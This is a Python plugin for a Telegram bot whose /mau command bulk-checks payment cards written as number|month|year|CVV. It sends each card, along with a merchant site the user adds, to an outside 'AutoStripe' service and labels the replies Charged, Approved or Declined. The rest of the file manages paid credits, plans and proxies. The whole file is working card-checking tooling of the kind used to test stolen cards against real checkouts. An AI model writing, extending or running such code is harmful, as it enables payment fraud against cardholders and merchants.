import re
import os
import json
import time
import httpx
import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ChatType

# AutoStripe API Config
AUTOSTRIPE_BASE_URL = "https://blackxcard-autostripe.onrender.com"
AUTOSTRIPE_GATEWAY = "autostripe"
AUTOSTRIPE_KEY = "Blackxcard"

user_locks = {}

def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def load_sites():
    try:
        with open("DATA/sites.json", "r") as f:
            return json.load(f)
    except:
        return {}

def get_proxy(user_id):
    try:
        with open("DATA/proxy.json", "r") as f:
            proxies = json.load(f)
        return proxies.get(str(user_id))
    except:
        return None

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def chunk_cards(cards, size):
    for i in range(0, len(cards), size):
        yield cards[i:i + size]

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def get_status_flag(raw_response):
    response_upper = str(raw_response).upper()
    
    if any(keyword in response_upper for keyword in [
        "CHARGED", "ORDER_PLACED", "ORDER PLACED", "THANK YOU", "PAYMENT SUCCESS", "APPROVED"
    ]):
        return "Charged 💎"
    elif any(keyword in response_upper for keyword in [
        "SUCCEED", "SUCCESS", "CCN", "CVN", "LIVE", "3DS", "3D_SECURE", "3D SECURE",
        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "INVALID_CVC", "INVALID CVC",
        "INCORRECT_CVC", "INCORRECT CVC", "CVV", "CVC", "AUTHENTICATION",
        "ZIP", "ADDRESS", "BILLING", "CARD_ERROR", "CARD ERROR", "RISK", "FRAUD",
        "LIMIT", "DO_NOT_HONOR", "DO NOT HONOR", "LOST", "STOLEN", "TRY_AGAIN"
    ]):
        return "Approved ✅"
    elif any(keyword in response_upper for keyword in [
        "DECLINED", "DECLINE", "REJECTED", "REJECT", "FAILED", "FAIL", "DEAD",
        "INVALID CARD", "INVALID_CARD", "CARD_DECLINED", "CARD DECLINED",
        "NOT SUPPORTED", "UNSUPPORTED", "EXPIRED", "BLOCKED"
    ]):
        return "Declined ❌"
    else:
        return "Declined ❌"

async def check_autostripe(site, cc):
    url = f"{AUTOSTRIPE_BASE_URL}/gateway={AUTOSTRIPE_GATEWAY}/key={AUTOSTRIPE_KEY}/site={site}/cc={cc}"
    try:
        async with httpx.AsyncClient(timeout=120.0) as client:
            response = await client.get(url)
            return response.text.strip() if response.text else "NO_RESPONSE"
    except httpx.TimeoutException:
        return "Timeout"
    except Exception as e:
        return f"Error"

@Client.on_message(filters.command("mau") | filters.regex(r"^\.mau(\s|$)"))
async def mau_handler(client, message):
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /mau is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        allowed_groups = load_allowed_groups()
        
        if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP] and message.chat.id not in allowed_groups:
            return await message.reply(
                "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        mlimit = plan_info.get("mlimit", 10)
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        sites = load_sites()
        if user_id not in sites:
            return await message.reply(
                "<pre>Site Not Found ⚠️</pre>\n<code>Use /addurl to add site first</code>",
                reply_to_message_id=message.id
            )
        
        user_site_info = sites[user_id]
        site = user_site_info["site"]
        gateway = user_site_info.get("gate", "AutoStripe")
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            return await message.reply(
                f"❌ Max {mlimit} cards allowed for your plan!",
                reply_to_message_id=message.id
            )
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        loader_msg = await message.reply(
            f"<pre>✦ [$mau] | M-AutoStripe</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>{gateway}</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time.time()
        final_results = []
        
        batch_size = 5
        
        for batch in chunk_cards(all_cards, batch_size):
            results = await asyncio.gather(*[
                check_autostripe(site, card) for card in batch
            ])
            
            for card, raw_response in zip(batch, results):
                status_flag = get_status_flag(raw_response or "")
                
                final_results.append(
                    f"• <b>Card:</b> <code>{card}</code>\n"
                    f"• <b>Status:</b> <code>{status_flag}</code>\n"
                    f"• <b>Response:</b> <code>{raw_response or '-'}</code>\n"
                    "━━━━━━━━━━━━"
                )
            
            try:
                await loader_msg.edit(
                    f"<pre>✦ [$mau] | M-AutoStripe</pre>\n"
                    + "\n".join(final_results[-10:]) + "\n"
                    f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                    f"<b>[⚬] Checked By:</b> {checked_by}",
                    disable_web_page_preview=True
                )
            except:
                pass
        
        end_time = time.time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        # Show last 15 results
        display_results = final_results[-15:] if len(final_results) > 15 else final_results
        
        await loader_msg.edit(
            f"<pre>✦ [$mau] | M-AutoStripe</pre>\n"
            f"{chr(10).join(display_results)}\n"
            f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
            f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
            f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]",
            disable_web_page_preview=True
        )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {e}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
